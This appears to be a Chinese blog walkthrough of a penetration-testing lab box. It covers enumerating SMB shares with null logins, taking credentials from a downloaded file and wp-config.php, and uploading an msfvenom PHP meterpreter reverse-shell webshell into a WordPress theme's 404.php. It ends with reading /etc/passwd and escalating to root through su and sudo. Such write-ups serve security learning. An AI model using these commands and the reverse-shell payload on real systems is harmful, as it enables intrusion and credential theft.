  <entry>
    <title></title>
    <url>/2024/09/11/SambaSMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88Serve%20Message%20Block)/</url>
    <content><![CDATA[<h1 id="Samba-SMB信息泄露"><a href="#Samba-SMB信息泄露" class="headerlink" title="Samba&#x2F;SMB信息泄露"></a>Samba&#x2F;SMB信息泄露</h1><p>Serve Message Block</p>
<p>&#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D;</p>
<p>SMB协议用来访问网络资源，下载对应的资源文件</p>
<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><code>nmap -sV ip</code> 探测开放服务</p>
<p><code>nmap -A -v -T4 ip </code>探测全部信息（T4——最大线程速度）</p>
<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
<h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol>
<li><p>针对SMB协议，使用空口令，弱口令尝试登陆，并查看敏感文件，下载查看；</p>
<p>1. </p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420222711076.png"
                      alt="image-20240420222711076"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420224819220.png"
                      alt="image-20240420224819220"
                ></p>
<p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420225025375.png"
                      alt="image-20240420225025375"
                ></p>
<p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
<p>连接mysql</p>
<p><code>mysql -h ip -u user -p</code></p>
<p>但是可能无法远程登录mysql，于是尝试ssh登录</p>
<p><code>ssh 用户名@ip</code></p>
<p>尝试数据库密码，密码错误</p>
</li>
<li><p>针对SMB协议远程溢出漏洞进行分析</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420231346369.png"
                      alt="image-20240420231346369"
                ></p>
<p>发现也没有漏洞</p>
</li>
</ol>
<h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
<p>扫描到网站后台目录</p>
<p>打开并输入用户名和密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420231938322.png"
                      alt="image-20240420231938322"
                ></p>
<h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<p>然后就是上传webshell，并且执行（访问具有webshell的php页面）</p>
<p>我们将webshell上传到editor的404.php页面</p>
<p>然后打开404页面</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">http://靶场IP/wordpress/wp-content/themes/twentyfourteen/404.php</span><br></pre></td></tr></table></figure></div>

<p>然后返回攻击机，发现成功监听，查看当前用户，执行以下命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>

<p>发现获得服务器的通用权限</p>
<p>优化终端</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>查看当前计算机的用户</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>

<p>查看敏感用户，发现一个togie</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su togie</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入密码为12345，前面获取的密码</span></span><br></pre></td></tr></table></figure></div>

<h3 id="4-提升权限"><a href="#4-提升权限" class="headerlink" title="4. 提升权限"></a>4. 提升权限</h3><p>查找共享目录下的敏感文件</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure></div>

]]></content>
  </entry>
